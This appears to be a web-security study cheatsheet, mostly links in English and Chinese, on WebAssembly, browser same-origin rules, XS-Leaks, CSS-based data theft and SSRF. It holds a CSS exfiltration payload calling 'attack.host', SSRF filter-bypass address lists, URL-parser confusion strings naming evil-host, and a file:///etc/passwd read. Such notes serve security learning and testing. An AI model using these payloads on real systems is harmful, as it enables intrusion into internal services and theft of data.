# Security Learning    
Cheatsheet, Links, Enjoy it  ☕️  

| Topic        | Des           |
| ------------- |:-------------:|
| [How to take good practice](#how-to-take-a-good-practice) | learn security, read source code... |
| [WASM](#wasm) | Web Assembly |
| [Frontend](#frontend) | Browser knowledge |
| [XSS](#xss) | XSS |
| [SSRF](#ssrf) | SSRF |


# How to take a good practice
* [安全研究者的自我修养](https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&mid=2247483913&idx=1&sn=2a0558592e072389e348dc8f7c6223d1&chksm=fb0416f1cc739fe7aed6f45167dc5a555974aaeb250cdcdc3bdd973ae151b8534a7c2cef6c43&scene=21#wechat_redirect)  
* [So you want to be a web security researcher?](https://portswigger.net/blog/so-you-want-to-be-a-web-security-researcher)  
* [如何阅读一份源代码？](https://www.codedump.info/post/20190324-how-to-read-code/)  

# WASM
* [WebAssembly Concepts
](https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts)  
* [Using the WebAssembly JavaScript API
](https://developer.mozilla.org/en-US/docs/WebAssembly/Using_the_JavaScript_API)  
* [Introduction to WebAssembly](https://sensepost.com/blog/2018/introduction-to-webassembly/)  
* [玩轉 WebAssembly && 逆向](https://blog.1pwnch.com/web/reverse/2019/05/22/Say-Hello-to-WASM/#more)

# Frontend
* [你真的会使用XMLHttpRequest吗?](https://segmentfault.com/a/1190000004322487)  
* [SOP與CORS安全詳解](https://jiwo.org/ken/detail.php?id=2393)  

# XSS
## XS-Leaks
* [Exposing Intranets with reliable Browser-based Port scanning](https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning)  
* [从35c3CTF的filemanager题目中学到的一个小tips](https://blog.wonderkun.cc/2018/12/30/%E4%BB%8E35c3CTF%E7%9A%84filemanager%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Ftips/#more)  
* [github-xsleaks](https://github.com/xsleaks/xsleaks/wiki)  
* [secret note keeper -- Facebook CTF 2019](https://sectt.github.io/writeups/FBCTF19/secret_note_keeper/README)  
* [gimme-a-bit-exploring-attacks-in-the-post-xss-world](https://speakerdeck.com/lmt_swallow/gimme-a-bit-exploring-attacks-in-the-post-xss-world)  

雖然和XSS一樣是跨域偷信息的技巧，但因為受限於SOP所以不是直接回傳信息，而是利用盲注: **配合爆破觀察瀏覽器的行為**(猜中和沒猜中頁面會有何差異)! 至於如何跨域觀察瀏覽器的行為呢? 特定信息是可以跨域傳送的，像是iframe count就不受SOP的限制，樓上35c3的filemanager就是利用onload數量和xss-auditor來跨域爆破出flag的!  

## Steal data with CSS
* [使用CSS窃取数据：攻击与防守](http://www.fwheart.club/2019/04/08/[%E8%AF%91]%E4%BD%BF%E7%94%A8CSS%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%EF%BC%9A%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/)  

在頁面中注入css，利用attribute selector，若match則傳送特定query (`{background:url("https://attack.host/aa");}`) 到自己的server以竊取資訊!  

# SSRF
Find server's API which will send request  
## Bypass IP, URL limit
```c
127.0.0.1
127.0.1
127.1
0.0.0.0   // linux
0.0
0
127.0.0.1.xip.io
0x7f000001
2130706433
017700000001
ⓛⓞⓒⓐⓛⓗⓞⓢⓣ   // enclosed alphanumerics
[::]
// use to port to bypass ip segment limit
127.0.0.1:80

// intranet
10.0.0.0/8   // 10.0.0.0 ~ 10.255.255.255
172.16.0.0/12   // 172.16.0.0 ~ 172.31.255.255
192.168.0.0/16  // 192.168.0.0 ~ 192.168.255.255
127.0.0.0/8
0.0.0.0/8
```  
* Obfuscation: double URL-encoding  
* According to RFC3968  
  url preceded by a double slash, terminated by the next slash, `?` or `#`, or the end of url.  
  check url supports `@` (embedded credential) or not, combine following payloads with obfuscation  
  * `evil-host#@expected-host`  
  * `expected-host#@evil-host:evil-port:expected-port`  
  * `expected-host@evil-host`  
  * `evil-host#expected-host`  

Match rules:  
```php
// php
parse_url():
host: the host after the last @

// libcurl
host: the host after the first @
```

## 302 Redirect bypass  
Check only first time and ignore the second time  
find redirect vulnerability e.g. `http://aaa.com/a?req=/b`  
put into API **which is already believed by server** e.g. `api=http://aaa.com/a?req=evil-host`

## Protocol
* `dict://<user-auth>@<host>:<port>/`  
* `sftp://`  
* `file://`  
  ```c
  file:///etc/passwd
  // the part of first two slashes after file is <protocol>
  // the third slash is <root dir>
  file://domain/etc/passwd
  ```
* `tftp://`  
* `ldap://`  
* `gopher://`  
  [利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)

## Blind-SSRF

## Some more challenges?
* Only partial url is controlled?  


## Tool
* [requestbin](https://requestbin.com/)  
* [CEYE](http://ceye.io/)

## Reference
* [Portsigger material](https://portswigger.net/web-security/ssrf)  
* [了解SSRF，這一篇就足夠了](https://xz.aliyun.com/2115)  
* [SSRF testing resources](https://github.com/cujanovic/SSRF-Testing)  
* [談一談如何在python開發中拒絕SSRF漏洞](https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html)  
* [SSRF 學習紀錄](https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view)
